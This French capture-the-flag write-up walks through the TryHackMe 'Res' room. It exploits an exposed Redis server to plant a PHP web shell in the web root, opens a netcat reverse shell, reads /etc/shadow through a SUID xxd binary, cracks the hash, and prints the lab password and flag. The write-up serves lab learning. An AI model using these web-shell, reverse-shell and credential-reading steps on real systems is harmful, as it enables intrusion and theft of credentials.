<a href="https://ezbyk.github.io/tryhackme-ctf-res/">Back on the site</a>



---
        Tryhackme: RES (database exploitation)
---

---
enumeration 
---


    $nmap -p- IPADDR
 
     Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 13:43 CEST    
     Nmap scan report for 10.10.84.180   
     Host is up (0.085s latency).    
     Not shown: 65533 closed ports   
     PORT     STATE SERVICE  
     80/tcp   open  http 
     6379/tcp open  redis    
     
     
 On peux voir 2 ports ouvert  on a un serveur apache et le le gestionnaire de base de donnés 
 mais je vois pas grand chose d'intéressant à exploiter sur le site
 

 je vais commencer par me connecter puis essayer d'avoir la version: 
  en cherchant j'ai trouvé la commande "info" pour avoir les informations sur le gestionnaire
    
    
    
   

    root@Urahara:~# redis-cli -h IPADDR  
    10.10.84.180:6379> info 
    ##Server 
    redis_version:6.0.7 
     (je montre que le haut du résulat qui nous intéresse)
   
![r](https://cdn.discordapp.com/attachments/519930659620257797/832739076687134800/68747470733a2f2f692e696d6775722e636f6d2f344d37495777502e676966.gif)

---
exploit
---
   
  maintenant je dois trouver le moyen pour avoir un shell <br>
   après quelque recherche j'ai trouver ce site <br>
   https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce <br>
    j'ai suis les instructions en modifiants quelque truc: 

   
    10.85.0.52:6379> config set dir /var/www/html (chemin du serveur apache)
    OK 
    10.85.0.52:6379> config set dbfilename redis.php 
    OK 
    10.85.0.52:6379> set test  "<?php system($_GET['cmd']); ?> (parametre cmd pour injection de commande)
    OK 
    10.85.0.52:6379> save 
    OK

   puis maintenant je me redirige sur le site /redis.php et je vois que la page à bien été crée <br>
  
   donc avec le script php que j'ai pris comme paramètre cmd pout l'exploiter je fais <br>
   
    http://IPADDR/redis.php?cmd=(la command)
  
  et je vois bien que le résulat de la commande marche mais c'est pas très pratique :( <br> 
   et c'est ici qu'on va faire notre reverse shell: <br>
    
    nc -nlvp 1234
    après avoir mis le port en écoute je fais
    http://IPADDR/redis.php?cmd=nc -e /bin/sh (ip tun0) 1234
    
  puis je vois que j'ai bien réussi !
  
    nc -nlvp 1234
    listening on [any] 1234 ...
    connect to [10.14.13.16] from (UNKNOWN) [10.10.84.180] 35234
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    python -c "import pty;pty.spawn('/bin/bash')" (pour avoir une shell plus stable)
    www-data@ubuntu:/var/www/html$
    
    
   maintenant que nous avons un shell il faut monter de privilèges jusqu'à root 
![r](https://cdn.discordapp.com/attachments/519930659620257797/832739076687134800/68747470733a2f2f692e696d6775722e636f6d2f344d37495777502e676966.gif)

--- 
privilege escalation
---

find / -perm -4000 -type f 2>/dev/null
   et ça on tombe sur xxd que je pouvais executer en tant que www-data avec les permissions root <br>
    puis il nous faut le mot de passe du user local j'ai eu la brillante idée de ouvrir /etc/shadow avec les perm root pour avoir peux-être le hash du user
    
       xxd /etc/shadow
       
   c'est pas très lisible mais à la fin on retrouve l'utilisateur local et un hash: <br>
  $6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0
je décide de le cracker avec john :
  
    $ john rediscrack.txt
    
    WARNING: cgroup v2 is not fully supported yet, proceeding with partial confinement
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
       Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 12 OpenMP threads
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/snap/john-the-ripper/current/run/password.lst, rules:Wordlist
    beautiful1       (?)
    1g 0:00:00:01 DONE 2/3 (2021-07-18 15:01) 0.9009g/s 9686p/s 9686c/s 9686C/s blisses..cookies1
     se the "--show" option to display all of the cracked passwords reliably
     Session completed

   donc on récup le mot de passe de vianka : beautiful1
   
   on peux se login en tant que vianka mais ça m'intéresse pas
   si on peux executer xxd avec les permissions root nous avons juste à faire
   
    www-data@ubuntu:/home/vianka$ xxd /root/root.txt
    xxd /root/root.txt 
    00000000: 7468 6d7b 7878 645f 7072 3176 5f65 7363  thm{xxd_pr1v_esc
      00000010: 616c 6174 316f 6e7d 0a                   alat1on}.
  
 Enjoy :)
   
